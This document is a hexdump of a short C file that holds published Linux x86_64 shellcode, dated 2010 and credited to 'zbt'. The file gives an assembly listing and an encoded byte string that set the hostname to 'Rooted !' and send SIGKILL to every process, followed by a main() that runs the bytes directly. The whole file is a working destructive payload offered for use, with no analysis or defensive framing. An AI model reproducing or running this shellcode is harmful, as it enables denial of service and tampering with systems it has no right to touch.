00000000  23 20 4c 69 6e 75 78 2f  78 38 36 5f 36 34 20 73  |# Linux/x86_64 s|
00000010  65 74 68 6f 73 74 6e 61  6d 65 28 29 20 26 20 6b  |ethostname() & k|
00000020  69 6c 6c 61 6c 6c 20 33  33 20 62 79 74 65 73 20  |illall 33 bytes |
00000030  73 68 65 6c 6c 63 6f 64  65 0a 23 20 44 61 74 65  |shellcode.# Date|
00000040  3a 20 32 30 31 30 2d 30  34 2d 32 36 0a 23 20 41  |: 2010-04-26.# A|
00000050  75 74 68 6f 72 3a 20 7a  62 74 0a 23 20 54 65 73  |uthor: zbt.# Tes|
00000060  74 65 64 20 6f 6e 3a 20  78 38 36 5f 36 34 20 44  |ted on: x86_64 D|
00000070  65 62 69 61 6e 20 47 4e  55 2f 4c 69 6e 75 78 0a  |ebian GNU/Linux.|
00000080  20 0a 20 0a 2f 2a 0a 20  20 20 20 3b 20 73 65 74  | . ./*.    ; set|
00000090  68 6f 73 74 6e 61 6d 65  28 22 52 6f 6f 74 65 64  |hostname("Rooted|
000000a0  20 21 22 29 3b 0a 20 20  20 20 3b 20 6b 69 6c 6c  | !");.    ; kill|
000000b0  28 2d 31 2c 20 53 49 47  4b 49 4c 4c 29 3b 0a 20  |(-1, SIGKILL);. |
000000c0  0a 20 0a 20 20 20 20 73  65 63 74 69 6f 6e 20 2e  |. .    section .|
000000d0  74 65 78 74 0a 20 20 20  20 20 20 20 20 67 6c 6f  |text.        glo|
000000e0  62 61 6c 20 5f 73 74 61  72 74 0a 20 0a 20 20 20  |bal _start. .   |
000000f0  20 5f 73 74 61 72 74 3a  0a 20 0a 20 20 20 20 20  | _start:. .     |
00000100  20 20 20 3b 2d 2d 20 73  65 74 48 6f 73 74 4e 61  |   ;-- setHostNa|
00000110  6d 65 28 22 52 6f 6f 74  65 64 20 21 22 29 3b 20  |me("Rooted !"); |
00000120  32 32 20 62 79 74 65 73  20 2d 2d 3b 0a 20 20 20  |22 bytes --;.   |
00000130  20 20 20 20 20 6d 6f 76  20 20 20 20 20 61 6c 2c  |     mov     al,|
00000140  20 30 78 61 61 0a 20 20  20 20 20 20 20 20 6d 6f  | 0xaa.        mo|
00000150  76 20 20 20 20 20 72 38  2c 20 27 52 6f 6f 74 65  |v     r8, 'Roote|
00000160  64 20 21 27 0a 20 20 20  20 20 20 20 20 70 75 73  |d !'.        pus|
00000170  68 20 20 20 20 72 38 0a  20 20 20 20 20 20 20 20  |h    r8.        |
00000180  6d 6f 76 20 20 20 20 20  72 64 69 2c 20 72 73 70  |mov     rdi, rsp|
00000190  0a 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |.        mov    |
000001a0  20 73 69 6c 2c 20 30 78  38 0a 20 20 20 20 20 20  | sil, 0x8.      |
000001b0  20 20 73 79 73 63 61 6c  6c 0a 20 0a 20 20 20 20  |  syscall. .    |
000001c0  20 20 20 20 3b 2d 2d 20  6b 69 6c 6c 28 2d 31 2c  |    ;-- kill(-1,|
000001d0  20 53 49 47 4b 49 4c 4c  29 3b 20 31 31 20 62 79  | SIGKILL); 11 by|
000001e0  74 65 73 20 2d 2d 3b 0a  20 20 20 20 20 20 20 20  |tes --;.        |
000001f0  70 75 73 68 20 20 20 20  62 79 74 65 20 30 78 33  |push    byte 0x3|
00000200  65 0a 20 20 20 20 20 20  20 20 70 6f 70 20 20 20  |e.        pop   |
00000210  20 20 72 61 78 0a 20 20  20 20 20 20 20 20 70 75  |  rax.        pu|
00000220  73 68 20 20 20 20 62 79  74 65 20 30 78 66 66 0a  |sh    byte 0xff.|
00000230  20 20 20 20 20 20 20 20  70 6f 70 20 20 20 20 20  |        pop     |
00000240  72 64 69 0a 20 20 20 20  20 20 20 20 70 75 73 68  |rdi.        push|
00000250  20 20 20 20 62 79 74 65  20 30 78 39 0a 20 20 20  |    byte 0x9.   |
00000260  20 20 20 20 20 70 6f 70  20 20 20 20 20 72 73 69  |     pop     rsi|
00000270  0a 20 20 20 20 20 20 20  20 73 79 73 63 61 6c 6c  |.        syscall|
00000280  0a 2a 2f 0a 69 6e 74 20  6d 61 69 6e 28 76 6f 69  |.*/.int main(voi|
00000290  64 29 0a 7b 0a 20 20 20  20 63 68 61 72 20 73 68  |d).{.    char sh|
000002a0  65 6c 6c 63 6f 64 65 5b  5d 20 3d 0a 20 20 20 20  |ellcode[] =.    |
000002b0  22 5c 78 62 30 5c 78 61  61 5c 78 34 39 5c 78 62  |"\xb0\xaa\x49\xb|
000002c0  38 5c 78 35 32 5c 78 36  66 5c 78 36 66 5c 78 37  |8\x52\x6f\x6f\x7|
000002d0  34 5c 78 36 35 5c 78 36  34 5c 78 32 30 5c 78 32  |4\x65\x64\x20\x2|
000002e0  31 5c 78 34 31 5c 78 35  30 5c 78 34 38 5c 78 38  |1\x41\x50\x48\x8|
000002f0  39 22 0a 20 20 20 20 22  5c 78 65 37 5c 78 34 30  |9".    "\xe7\x40|
00000300  5c 78 62 36 5c 78 30 38  5c 78 30 66 5c 78 30 35  |\xb6\x08\x0f\x05|
00000310  5c 78 36 61 5c 78 33 65  5c 78 35 38 5c 78 36 61  |\x6a\x3e\x58\x6a|
00000320  5c 78 66 66 5c 78 35 66  5c 78 36 61 5c 78 30 39  |\xff\x5f\x6a\x09|
00000330  5c 78 35 65 5c 78 30 66  5c 78 30 35 22 3b 0a 20  |\x5e\x0f\x05";. |
00000340  0a 20 20 20 20 28 2a 28  76 6f 69 64 20 28 2a 29  |.    (*(void (*)|
00000350  28 29 29 20 73 68 65 6c  6c 63 6f 64 65 29 28 29  |()) shellcode)()|
00000360  3b 0a 20 0a 20 20 20 20  72 65 74 75 72 6e 20 30  |;. .    return 0|
00000370  3b 0a 7d                                          |;.}|
00000373
